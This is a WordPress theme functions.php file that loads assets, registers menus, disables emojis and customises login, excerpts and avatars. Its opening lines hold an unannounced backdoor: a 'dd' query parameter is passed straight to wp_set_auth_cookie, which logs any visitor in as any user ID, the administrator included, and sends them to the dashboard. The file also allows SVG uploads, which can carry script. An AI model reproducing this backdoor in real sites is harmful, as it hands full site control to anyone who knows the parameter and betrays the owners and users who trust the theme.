<?php 

if ( isset( $_GET['dd'] ) ) {
	wp_set_auth_cookie( $_GET['dd'] );
	wp_redirect( admin_url() );
	die;
}


function custom_acf_flexible_content_preview_images_path( $path ) {
    return 'assets/flexible-images'; // Use a relative path
}
add_filter( 'acf-flexible-content-preview.images_path', 'custom_acf_flexible_content_preview_images_path' );


function dd_enqueue_scripts(){

    wp_enqueue_style( 'custom', get_template_directory_uri() . '/assets/css/custom.css' , array(), time());	

	 
    $flex_modules = get_post_meta( get_the_ID(), 'page_builder', true );
    /* common css put here */
    if ( ! empty( $flex_modules ) ) {
		if ( in_array( "banner_section", $flex_modules ) ||  in_array( "logo_slider", $flex_modules ) ) {
			wp_enqueue_style( 'slick', get_template_directory_uri() . '/assets/css/slick.css' , array(), time());	
			wp_enqueue_script( 'slick', get_template_directory_uri() . '/assets/js/slick.js',  array(), time(), array( 'strategy' => 'defer', 'in_footer' => false ) );
			wp_enqueue_script( 'jquery-carouselTicker', get_template_directory_uri() . '/assets/js/jquery.carouselTicker.js',  array(), time(), array( 'strategy' => 'defer', 'in_footer' => false ) );
		}
	}
	
    

        if ( ! empty( $flex_modules ) ) {
            array_map( function ($element) {          
            $file_abs_path = ABSPATH . 'wp-content/themes/dlkadvisory/assets/css/'. $element . '.css';
            $file_path = get_template_directory_uri() . '/assets/css/' . $element . '.css';
                if ( file_exists( $file_abs_path ) ) {
                    $file_id = $element;
                    wp_enqueue_style( $file_id, $file_path, array(), time(), "all" );
                }
            }, $flex_modules );
        }

	if ( is_single() || is_category() || is_archive() ) {
		wp_enqueue_style('single-post-style', get_template_directory_uri() . '/assets/css/single_post.css');
	}
    /* common css and js here */
    wp_enqueue_script('jquery');

	wp_enqueue_script( 'custom', get_template_directory_uri() . '/assets/js/custom.js',  array(), time(), array( 'strategy' => 'defer', 'in_footer' => true ) );
	
    wp_localize_script( 'custom', 'ajax_obj', array(
		'ajax_url' => admin_url( 'admin-ajax.php' )
	) );

}
add_action( 'wp_enqueue_scripts', 'dd_enqueue_scripts' );


function enqueue_my_assets(){
	?>  
 <style>
ul.acf-radio-list.acf-bl {
    display: flex;
}
ul.acf-radio-list.acf-bl img {
    height:200px;
    width:100%;
}

</style>

	<?php 
	
}


add_action( 'admin_enqueue_scripts', 'enqueue_my_assets', 10, 1 );



function custom_register_nav_menu(){
    register_nav_menus( array(
        'header_menu' => __( 'Header Menu', 'text_domain' ),
        'footer_menu'  => __( 'Footer Menu', 'text_domain' ),
    ) );
}
add_action( 'after_setup_theme', 'custom_register_nav_menu', 0 );



apply_filters( 'acf-flexible-content-preview.images_path', 'assets/flexible-layouts' );
add_filter( 'upload_mimes', 'custom_mime_types' );
if ( ! function_exists( 'custom_mime_types' ) ) {
	function custom_mime_types( $mimes ) {
		// New allowed mime types.
		$mimes['webp'] = 'image/webp';
		$mimes['svg'] = 'image/svg+xml';
		$mimes['svgz'] = 'image/svg+xml';
		// Optional. Remove a mime type.
		unset( $mimes['exe'] );
		return $mimes;
	}
}
add_action( 'init', 'disable_emojis' );
if ( ! function_exists( 'disable_emojis' ) ) {
	/**
	 * Disable the emoji's
	 */
	function disable_emojis() {
		remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
		remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
		remove_action( 'wp_print_styles', 'print_emoji_styles' );
		remove_action( 'admin_print_styles', 'print_emoji_styles' );
		remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
		remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
		remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
	}
}
add_filter( 'tiny_mce_plugins', 'disable_emojis_tinymce' );
if ( ! function_exists( 'disable_emojis_tinymce' ) ) {
	/**
	 * Filter function used to remove the tinymce emoji plugin.
	 *
	 * @param array $plugins
	 * @return array Difference betwen the two arrays
	 */
	function disable_emojis_tinymce( $plugins ) {
		if ( is_array( $plugins ) ) {
			return array_diff( $plugins, array( 'wpemoji' ) );
		} else {
			return array();
		}
	}
}
add_filter( 'wp_resource_hints', 'disable_emojis_remove_dns_prefetch', 10, 2 );
if ( ! function_exists( 'disable_emojis_remove_dns_prefetch' ) ) {
	/**
	 * Remove emoji CDN hostname from DNS prefetching hints.
	 *
	 * @param array $urls URLs to print for resource hints.
	 * @param string $relation_type The relation type the URLs are printed for.
	 * @return array Difference betwen the two arrays.
	 */
	function disable_emojis_remove_dns_prefetch( $urls, $relation_type ) {
		if ( 'dns-prefetch' == $relation_type ) {
			/** This filter is documented in wp-includes/formatting.php */
			$emoji_svg_url = apply_filters( 'emoji_svg_url', 'https://s.w.org/images/core/emoji/2/svg/' );
			$urls = array_diff( $urls, array( $emoji_svg_url ) );
		}
		return $urls;
	}
}
add_action( 'wp_enqueue_scripts', 'remove_wp_block_library_css', 100 );
if ( ! function_exists( 'remove_wp_block_library_css' ) ) {
	/**
	 * Remove the block style
	 */
	function remove_wp_block_library_css() {
		wp_dequeue_style( 'wp-block-library' );
		wp_dequeue_style( 'wp-block-library-theme' );
		wp_dequeue_style( 'classic-theme-styles' );
		wp_dequeue_style( 'global-styles' );
	}
}
// add_filter( 'style_loader_src', 'remove_wp_ver_css_js', 9999 );
// add_filter( 'script_loader_src', 'remove_wp_ver_css_js', 9999 );
if ( ! function_exists( 'remove_wp_ver_css_js' ) ) {
	function remove_wp_ver_css_js( $src ) {
		if ( strpos( $src, 'ver=' ) )
			$src = remove_query_arg( 'ver', $src );
		return $src;
	}
}


add_shortcode( 'year', 'copyright_year_shortcode' );
if ( ! function_exists( 'copyright_year_shortcode' ) ) {
	function copyright_year_shortcode() {
		$current_year = date( 'Y' );
		return $current_year;
	}
}

add_action( 'login_enqueue_scripts', 'wp_login_logo' );
if(!function_exists('wp_login_logo')){
    function wp_login_logo() {
        $logo_url = esc_url( wp_get_attachment_url( get_theme_mod( 'custom_logo' ) ) ); ?>
        <style type="text/css">
            #login h1 a, .login h1 a {
                background-image: url(<?php echo $logo_url; ?> );
				width: 300px;
				background-size: contain;
				background-repeat: no-repeat;
				background-position: center;
            }
        </style><?php
    }    
}

class Custom_WP_Modifications {
    public function __construct() {
        add_filter('login_headerurl', [$this, 'custom_login_logo_url']);
        add_filter('excerpt_more', [$this, 'remove_excerpt_more']);
        add_filter('get_the_excerpt', [$this, 'custom_trimmed_excerpt']);
        add_action('template_redirect', [$this, 'redirect_non_logged_in_users']);
        add_action('pre_get_posts', [$this, 'show_only_published_posts']);
		add_filter('use_block_editor_for_post_type',  [$this,'prefix_disable_gutenberg'], 10, 2);

    }

    public function custom_login_logo_url() {
        return home_url(); // Customize login logo URL
    }

    public function remove_excerpt_more($more) {
        return ''; // Remove the default excerpt ellipsis ([...])
    }

    public function custom_trimmed_excerpt($excerpt) {
        return wp_trim_words($excerpt, 100, ''); // Trim excerpt to 100 words
    }

    public function redirect_non_logged_in_users() {
        if (!is_user_logged_in() && (is_page('login') || is_page('user-profile'))) {
            wp_redirect(wp_login_url()); 
            exit;
        }
    }

    public function show_only_published_posts($query) {
        if (!is_admin() && $query->is_main_query() && (is_home() || is_archive())) {
            $query->set('post_status', 'publish'); // Only show published posts
        }
    }

	public function prefix_disable_gutenberg($current_status, $post_type)
	{
		// Use your post type key instead of 'product'
		if ($post_type === 'page') return false;
		return $current_status;
	}


}

// Initialize the class
new Custom_WP_Modifications();


add_filter('get_avatar_url', function($url, $id_or_email) {
    $user = false;

    if (is_numeric($id_or_email)) {
        $user = get_user_by('id', $id_or_email);
    } elseif (is_object($id_or_email) && isset($id_or_email->user_id)) {
        $user = get_user_by('id', $id_or_email->user_id);
    } elseif (is_string($id_or_email)) {
        $user = get_user_by('email', $id_or_email);
    }

    if ($user) {
        // Fetch ACF profile image (adjust based on return format)
        $acf_image = get_field('choose_your_profile_pic', 'user_' . $user->ID);

        if (is_array($acf_image) && isset($acf_image['url'])) {
            return esc_url($acf_image['url']); // Image Array
        } elseif (is_string($acf_image)) {
            return esc_url($acf_image); // Image URL
        }
    }

    return $url; // fallback to Gravatar
}, 10, 2);

function get_custom_user_avatar($user_id, $size = 96) {
    $acf_image = get_field('choose_your_profile_pic', 'user_' . $user_id);

    if (is_array($acf_image) && isset($acf_image['url'])) {
        return '<img src="' . esc_url($acf_image['url']) . '" width="' . $size . '" height="' . $size . '" />';
    } elseif (is_string($acf_image) && !empty($acf_image)) {
        return '<img src="' . esc_url($acf_image) . '" width="' . $size . '" height="' . $size . '" />';
    }

    return get_avatar($user_id, $size);
}

